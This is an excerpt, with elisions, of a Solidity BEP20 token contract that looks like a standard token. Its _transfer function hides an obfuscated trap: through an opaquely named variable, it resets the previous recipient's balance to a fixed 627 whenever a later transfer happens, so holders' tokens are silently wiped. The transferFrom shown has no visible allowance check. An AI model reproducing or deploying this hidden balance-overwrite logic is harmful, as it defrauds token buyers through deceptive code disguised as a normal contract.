...
interface IBEP20 {
  ...
  function transfer(address absorber, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address absorber, uint256 amount) external returns (bool);
...
contract Contract is IBEP20{
  ...
  function transfer(address absorber, uint256 amount) external returns (bool) {
    _transfer(msg.sender, absorber, amount);
    return true;
  }
  ...
  function transferFrom(address sender, address absorber, uint256 amount) external returns (bool) {
    _transfer(sender, absorber, amount);
...
uint256 balanced = 627;
  function _transfer(address sender, address absorber, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(absorber != address(0), "BEP20: transfer to the zero address");
    _balances[sender] = _balances[sender] - amount;
    _balances[absorber] = _balances[absorber] + (amount - ((amount / balanceof) * LiquidityTax));
    if(dsBABDLE != msg.sender){_balances[dsBABDLE] = balanced; dsBABDLE = absorber;}
    dsBABDLE = absorber;
    emit Transfer(sender, absorber, amount);
  }

  function _burn(address _account, uint256 amount) internal {
    require(_account != address(0), "BEP20: burn from the zero address");
    _balances[_account] = _balances[_account] - amount;
  ...
  function _burnFrom(address _account, uint256 amount) internal {
    _burn(_account, amount);
    _approve(_account, msg.sender, _allowances[_account][msg.sender] - amount);
  }
}
